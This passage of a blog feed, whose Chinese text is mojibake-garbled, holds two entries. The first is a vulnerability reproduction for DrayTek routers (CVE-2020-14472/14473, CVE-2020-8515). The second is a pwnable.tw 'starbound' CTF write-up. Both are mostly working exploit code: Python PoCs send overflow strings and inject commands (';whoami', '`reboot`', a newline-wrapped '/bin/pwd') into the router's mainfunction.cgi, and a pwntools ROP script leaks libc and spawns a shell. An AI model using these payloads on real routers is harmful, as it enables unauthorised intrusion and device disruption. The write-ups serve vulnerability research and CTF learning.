alt></p><p>åœ¨è¿™äº›å‡½æ•°ä¸­ï¼Œéƒ½ä½¿ç”¨äº†decode_urlï¼ˆå·²é‡å‘½åï¼‰å¯¹urlè¿›è¡Œè½¬ä¹‰æ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/usedecodeurl.png" alt></p><p>åœ¨url_decodeå‡½æ•°ä¸­è¿›å…¥è½¬ä¹‰å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/uridecode.png" alt><br><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/zhuanyi.png" alt></p><p>æ­¤å¤„å­˜åœ¨<strong>æº¢å‡ºã€2ã€‘</strong></p></li></ul><h2 id="pocï¼ˆç”¨çš„æ˜¯å…¬å¼€çš„ï¼ŒæœªéªŒè¯"><a href="#pocï¼ˆç”¨çš„æ˜¯å…¬å¼€çš„ï¼ŒæœªéªŒè¯" class="headerlink" title="pocï¼ˆç”¨çš„æ˜¯å…¬å¼€çš„ï¼ŒæœªéªŒè¯"></a>pocï¼ˆç”¨çš„æ˜¯å…¬å¼€çš„ï¼ŒæœªéªŒè¯</h2><ul><li>æº¢å‡ºã€1ã€‘</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">buf = b64encode(b&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;)</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/raw&quot;</span><br><span class="line">    &quot;Authorization&quot;: &quot;Basic &quot;+buf</span><br><span class="line">&#125;</span><br><span class="line">url = &#123;</span><br><span class="line">    &quot;root&quot;: &quot;http://192.168.1.1&quot;,</span><br><span class="line">    &quot;cgi&quot;: &#123;</span><br><span class="line">        &quot;root&quot;: &quot;/cgi-bin&quot;,</span><br><span class="line">        &quot;uri&quot;: &#123;</span><br><span class="line">            &quot;mf&quot;: &quot;/mainfunction.cgi&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def build_url(p1, p2=None):</span><br><span class="line">    if p2:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1][&quot;root&quot;] + url[p1][&quot;uri&quot;][p2]</span><br><span class="line">    else:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1]</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(build_url(&quot;cgi&quot;, &quot;mf&quot;)+&quot;/login&quot;, headers=header)</span><br></pre></td></tr></table></figure><ul><li>æº¢å‡ºã€2ã€‘</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def poc(url):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;UserAgent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url = url + &quot;/cgi-bin/mainfunction.cgi&quot;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;action&quot;: &quot;web_portal_bypass_ok&quot;,</span><br><span class="line">        &quot;url&quot;:&quot;http://&quot;+&quot;\x40&quot;*0xFFF+&quot;/&quot;,</span><br><span class="line">        &quot;is_android&quot;:&quot;ture&quot;</span><br><span class="line">    &#125;    </span><br><span class="line">    res = requests.post(url=url, verify = False, data=data, timeout=(10, 15), headers=headers)</span><br><span class="line"></span><br><span class="line">    if res.status_code != 200:</span><br><span class="line">        print(res.text)</span><br><span class="line">    else:</span><br><span class="line">        print(res.text)</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">poc(&quot;http://192.168.1.1&quot;)</span><br></pre></td></tr></table></figure><ul><li>å‘½ä»¤æ³¨å…¥ã€1~8ã€‘</li></ul><p>å¤§å¤šéƒ½æ˜¯æ¥è‡ªå‘é€çš„http_inputä¸­è¯»å–çš„å‚æ•°ï¼ŒæœªéªŒè¯å°±æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œç›´æ¥systemæ‰§è¡Œï¼Œå®ç°å‘½ä»¤æ³¨å…¥ã€‚ï¼ˆè„šæœ¬ä¼¼ä¹è¿˜æœ‰ä¸å¯¹â€¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;URL&quot;: &quot;xxx&quot;,</span><br><span class="line">    &quot;HOST&quot;: &quot;https://xxx&quot;,</span><br><span class="line">    &quot;action&quot;: &quot;apply&quot;,</span><br><span class="line">    &quot;config&quot;: &quot;;whoami&quot;</span><br><span class="line">&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/raw&quot;</span><br><span class="line">&#125;</span><br><span class="line">url = &#123;</span><br><span class="line">    &quot;root&quot;: &quot;https://xx&quot;,</span><br><span class="line">    &quot;cgi&quot;: &#123;</span><br><span class="line">        &quot;root&quot;: &quot;/cgi-bin&quot;,</span><br><span class="line">        &quot;uri&quot;: &#123;</span><br><span class="line">            &quot;mf&quot;: &quot;/mainfunction.cgi&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def build_url(p1, p2=None):</span><br><span class="line">    if p2:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1][&quot;root&quot;] + url[p1][&quot;uri&quot;][p2]</span><br><span class="line">    else:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1]</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(build_url(&quot;cgi&quot;, &quot;mf&quot;), data=data, headers=header)</span><br></pre></td></tr></table></figure><ul><li>å‘½ä»¤æ³¨å…¥ã€9ã€‘</li></ul><p>å…è®¸ï¼³ï¼­ï¼³ç™»å½•ï¼Œå¹¶å·²çŸ¥ç”¨æˆ·çš„æ‰‹æœºå·æˆ–è€…ï¼³ï¼­ï¼³ç®¡ç†å‘˜çš„æ‰‹æœºå·ç ï¼Œå°±å¯ä»¥åœ¨passwordä¸­æ‹¼æ¥shellå‘½ä»¤æ‰§è¡Œå‘½ä»¤æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;URL&quot;: &quot;192.168.1.1&quot;,</span><br><span class="line">    &quot;HOST&quot;: &quot;http://192.168.1.1&quot;,</span><br><span class="line">    &quot;action&quot;: &quot;authuser&quot;,</span><br><span class="line">    &quot;formusername&quot;: b64encode(b&quot;test&quot;).decode(),</span><br><span class="line">    &quot;formpassword&quot;: b64encode(b&quot;12345678`reboot`&quot;).decode(),</span><br><span class="line">    &quot;PHONENUMBER&quot;: argv[1] # the known phone number</span><br><span class="line">&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/raw&quot;</span><br><span class="line">&#125;</span><br><span class="line">url = &#123;</span><br><span class="line">    &quot;root&quot;: &quot;http://192.168.1.1&quot;,</span><br><span class="line">    &quot;cgi&quot;: &#123;</span><br><span class="line">        &quot;root&quot;: &quot;/cgi-bin&quot;,</span><br><span class="line">        &quot;uri&quot;: &#123;</span><br><span class="line">            &quot;mf&quot;: &quot;/mainfunction.cgi&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def build_url(p1, p2=None):</span><br><span class="line">    if p2:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1][&quot;root&quot;] + url[p1][&quot;uri&quot;][p2]</span><br><span class="line">    else:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1]</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(build_url(&quot;cgi&quot;, &quot;mf&quot;), data=data, headers=header)</span><br></pre></td></tr></table></figure><h1 id="CVE-2020-8515"><a href="#CVE-2020-8515" class="headerlink" title="CVE-2020-8515"></a>CVE-2020-8515</h1><p>å…¬ç½‘ä¸Šè¿™ä¸ªæ¼æ´åŸºæœ¬éƒ½å·²ä¿®å¤äº†â€¦ç®€å•ä»‹ç»ä¸€ä¸‹</p><p>æ¼æ´å­˜åœ¨äºä¸Šé¢è¯´çš„åˆ†æ”¯ä¸­çš„<code>login</code>å‡½æ•°ä¸­æ‰€æå–çš„<code>keyPath</code>ï¼Œé¦–å…ˆå¯¹<code>keyPath</code>è¿›è¡Œäº†checkï¼Œè¿‡æ»¤äº†å¸¸ç”¨çš„`;|&gt;$(ç©ºæ ¼ç­‰å‘½ä»¤æ‹¼æ¥å­—ç¬¦ï¼Œåé¢å°±æ˜¯å¸¸è§çš„å‘½ä»¤æ³¨å…¥ï¼Œå°†keyPathæ‹¼æ¥å­—ç¬¦ä¸²åpopen()ğŸ˜¥</p><h2 id="pocï¼ˆå·²éªŒè¯"><a href="#pocï¼ˆå·²éªŒè¯" class="headerlink" title="pocï¼ˆå·²éªŒè¯"></a>pocï¼ˆå·²éªŒè¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import requests</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">headers = requests.utils.default_headers()</span><br><span class="line">headers[&quot;User-Agent&quot;] = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><br><span class="line">data = &quot;action=login&amp;keyPath=%27%0A%2fbin%2f&quot; + &quot;pwd&quot;+ &quot;%0A%27&amp;loginUser=a&amp;loginPwd=a&quot;</span><br><span class="line">url = &#123;</span><br><span class="line">    &quot;root&quot;: &quot;http://192.168.1.1&quot;,</span><br><span class="line">    &quot;cgi&quot;: &#123;</span><br><span class="line">        &quot;root&quot;: &quot;/cgi-bin&quot;,</span><br><span class="line">        &quot;uri&quot;: &#123;</span><br><span class="line">            &quot;mf&quot;: &quot;/mainfunction.cgi&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def build_url(p1, p2=None):</span><br><span class="line">    if p2:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1][&quot;root&quot;] + url[p1][&quot;uri&quot;][p2]</span><br><span class="line">    else:</span><br><span class="line">        return url[&quot;root&quot;] + url[p1]</span><br><span class="line"></span><br><span class="line"># requests.adapters.DEFAULT_RETRIES = 5</span><br><span class="line"># session = requests.session()</span><br><span class="line"># session.keep_alive = False</span><br><span class="line">res = requests.post(build_url(&quot;cgi&quot;, &quot;mf&quot;), data=data, headers=headers, verify=False)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/8515loginpy.png" alt></p><blockquote><p>æ¼æ´è¯¦æƒ…ï¼š<a href="https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md" target="_blank" rel="noopener">https://github.com/Cossack9989/Vulns/blob/master/IoT/CVE-2020-14473.md</a></p><p>å‚è€ƒï¼š<a href="https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html" target="_blank" rel="noopener">https://bestwing.me/drayteck-vigor-vulnerability-disclosure.html</a></p><p><a href="https://www.freebuf.com/vuls/262765.html" target="_blank" rel="noopener">draytekæ¼æ´åˆ†æ å…¨å®¶æ¡¶</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2020-14472-CVE-2020-14473&quot;&gt;&lt;a href=&quot;#CVE-2020-14472-CVE-2020-14473&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-14472/CVE-2020-14473&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="p1Kk.github.io/categories/æ¼æ´å¤ç°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
    <category term="æ ˆæº¢å‡º" scheme="p1Kk.github.io/tags/æ ˆæº¢å‡º/"/>
    
    <category term="è·¯ç”±å™¨" scheme="p1Kk.github.io/tags/è·¯ç”±å™¨/"/>
    
    <category term="cve" scheme="p1Kk.github.io/tags/cve/"/>
    
    <category term="å‘½ä»¤æ³¨å…¥" scheme="p1Kk.github.io/tags/å‘½ä»¤æ³¨å…¥/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw starbound wp</title>
    <link href="p1Kk.github.io/2021/02/08/tw/tw%20starbound/"/>
    <id>p1Kk.github.io/2021/02/08/tw/tw%20starbound/</id>
    <published>2021-02-07T16:00:00.000Z</published>
    <updated>2021-03-11T09:02:01.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>ç¨‹åºè¿è¡Œæ˜¾ç¤ºæ‰¾ä¸åˆ° libcrypto1.0.0ï¼Œè¿è¡Œä¸‹åˆ—å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libssl1.0.0:i386</span><br></pre></td></tr></table></figure><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p>ç¨‹åºæµç¨‹å¤šï¼Œä½†æ˜¯æ¼æ´å¾ˆæ˜æ˜¾ï¼Œæ•°ç»„ä¸‹æ ‡å¯ä»¥è¶Šç•Œæ‰§è¡Œ</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/starbug.png" alt></p><blockquote><p>strtolå‡½æ•°ä¼šå°†å‚æ•°nptrå­—ç¬¦ä¸²æ ¹æ®å‚æ•°baseæ¥è½¬æ¢æˆé•¿æ•´å‹æ•°ï¼Œå‚æ•°baseèŒƒå›´ä»2è‡³36ã€‚</p><p>long int strtol(const char <em>nptr,char *</em>endptr,int base);</p><ul><li>å¦‚æœå­—ç¬¦ä¸²ä¸­çš„æ•´æ•°å€¼è¶…å‡ºlong intçš„è¡¨ç¤ºèŒƒå›´ï¼ˆ<strong>ä¸Šæº¢æˆ–ä¸‹æº¢</strong>ï¼‰ï¼Œåˆ™strtolè¿”å›å®ƒæ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§ï¼ˆæˆ–æœ€å°ï¼‰æ•´æ•°ï¼Œå¹¶è®¾ç½®errnoä¸ºERANGEï¼Œä¾‹å¦‚strtol(â€œ0XDEADbeef~~â€, NULL, 16)è¿”å›0x7fffffffå¹¶è®¾ç½®errnoä¸ºERANGE</li></ul></blockquote><p>åˆšå¥½ï¼Œåœ¨settingä¸­è®¾ç½®nameï¼Œå¯ä»¥è®¾ç½®ä¸‹æ ‡-33æŒ‡å‘nameï¼Œæ‰§è¡Œæˆ‘ä»¬åœ¨nameä¸­å†™å…¥çš„ä¸œä¸œã€‚åŒæ—¶ï¼Œè™½ç„¶ä»–ä¼šè¿‡æ»¤æˆ‘ä»¬è¾“å…¥çš„æ•°å­—ä¹‹åçš„å†…å®¹ï¼Œä½†æ˜¯è¿™åé¢çš„å†…å®¹è¿˜æ˜¯ä¼šè¢«å†™å…¥å†…å­˜ï¼Œå¯ä»¥ç”¨ä½œåç»­çš„gadgetã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.bss:080580D0 bss_name        db    ? ;               ; DATA XREF: do_afk+3â†‘o</span><br><span class="line">.bss:080580D0                                         ; init+1A8â†‘o ...</span><br><span class="line">......</span><br><span class="line">.bss:0805814F                 db    ? ;</span><br><span class="line">.bss:08058150 dword_8058150   dd ?                    ; DATA XREF: cmd_view+4Fâ†‘r</span><br><span class="line">.bss:08058150                                         ; init_map+A8â†‘w ...</span><br><span class="line">.bss:08058154 ; int bss_choice[]</span><br><span class="line">.bss:08058154 bss_choice      dd ?                    ; DATA XREF: show_main_menu:loc_8048DEFâ†‘w</span><br><span class="line">.bss:08058154                                         ; show_multiplayer_menu:loc_8048EBEâ†‘w ...</span><br><span class="line">.bss:08058158 dword_8058158   dd ?                    ; DATA XREF: show_main_menu+9Dâ†‘w</span><br><span class="line">.bss:08058158                                         ; show_multiplayer_menu+85â†‘w ...</span><br><span class="line">.bss:0805815C dword_805815C   dd ?                    ; DATA XREF: show_main_menu+A7â†‘w</span><br><span class="line">.bss:0805815C                                         ; show_multiplayer_menu+8Fâ†‘w ...</span><br><span class="line">.bss:08058160 dword_8058160   dd ?                    ; DATA XREF: show_main_menu+B1â†‘w</span><br><span class="line">.bss:08058160                                         ; show_multiplayer_menu+99â†‘w ...</span><br><span class="line">.bss:08058164 dword_8058164   dd ?                    ; DATA XREF: show_main_menu+BBâ†‘w</span><br><span class="line">.bss:08058164                                         ; show_multiplayer_menu+A3â†‘w ...</span><br><span class="line">.bss:08058168 dword_8058168   dd ?                    ; DATA XREF: show_main_menu+C5â†‘w</span><br><span class="line">.bss:08058168                                         ; show_multiplayer_menu+ADâ†‘w</span><br><span class="line">.bss:0805816C dword_805816C   dd ?                    ; DATA XREF: show_main_menu+CFâ†‘w</span><br><span class="line">.bss:08058170 dword_8058170   dd ?                    ; DATA XREF: show_main_menu+D9â†‘w</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æ²¡æœ‰ç»™libcï¼Œè¿˜éœ€è¦å¸ƒç½®æ ˆï¼Œæ³„éœ²å‡ºå‡½æ•°åœ°å€ï¼Œç„¶åDynELFæˆ–è€…libc_databaseæˆ–è€…LibcSearcheræ‰¾libc</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./starbound&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10202</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">main = 0x804A61B</span><br><span class="line">bss = 0x8058100</span><br><span class="line">add_esp = 0x08048e48# add esp, 0x1c ; ret</span><br><span class="line">pop_ebp = 0x080491bc</span><br><span class="line">p3_ret = 0x080494da# # pop ebx, pop esi, pop edi, ret</span><br><span class="line">leave_ret = 0x08048c58</span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;&gt; &quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def set_name(name):</span><br><span class="line">menu(6)# setting</span><br><span class="line">menu(2)# name </span><br><span class="line">io.sendline(name)</span><br><span class="line">menu(1)# back</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">def leak(addr):</span><br><span class="line">    payload  = &quot;&quot;</span><br><span class="line">    payload += p32(write_plt)</span><br><span class="line">    payload += p32(0x080494da)# pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">    payload += p32(1)</span><br><span class="line">    payload += p32(addr)</span><br><span class="line">    payload += p32(4)</span><br><span class="line">    io.sendafter(&quot;name: &quot;, payload)</span><br><span class="line">    menu(-33)</span><br><span class="line">    data = io.recv()</span><br><span class="line">    return data</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = 0</span><br><span class="line"></span><br><span class="line">set_name(p32(add_esp))</span><br><span class="line">menu(&quot;-33&quot;+&quot;aaaaa&quot;+p32(main))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload  = &quot;8aaaaaaa&quot;</span><br><span class="line">payload += p32(puts_plt) + p32(pop_ebp) + p32(puts_got)</span><br><span class="line">payload += p32(read_plt) + p32(p3_ret) + p32(0) + p32(bss) + p32(4*6+1)</span><br><span class="line">payload += p32(pop_ebp) + p32(bss-4) + p32(leave_ret)</span><br><span class="line">menu(payload)</span><br><span class="line">libc_puts = u32(io.recv(4))</span><br><span class="line">success(&quot;libc_puts = &quot;+hex(libc_puts))</span><br><span class="line"></span><br><span class="line"># libc6-i386_2.21-0ubuntu4_amd64 / libc6_2.23-0ubuntu11.2_i386</span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, libc_puts)</span><br><span class="line">libc_base = libc_puts - libc.dump(&quot;puts&quot;)</span><br><span class="line">sys_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">libc_base = libc_puts - libc.sym[&apos;puts&apos;]</span><br><span class="line">sys_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line"></span><br><span class="line">payload  = p32(sys_addr) + p32(0xdeadbeef) + p32(bss+4*4) + &quot;4aaa&quot; + &quot;/bin/sh\x00&quot;</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br></pre></td></tr></table></figure><p>è¿™è„šæœ¬ä¸å¼€debugè¿˜è·‘ä¸æˆäº†â€¦è¿™æ˜¯ä»€ä¹ˆé“ç†å•Šâ“</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æ&quot;&gt;&lt;/a&gt;åˆ†æ&lt;/h1&gt;&lt;h2 id=&quot;checksec&quot;&gt;&lt;a href=&quot;#checksec&quot; class=&quot;headerlink&quot; title=&quot;checksec&quot;</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
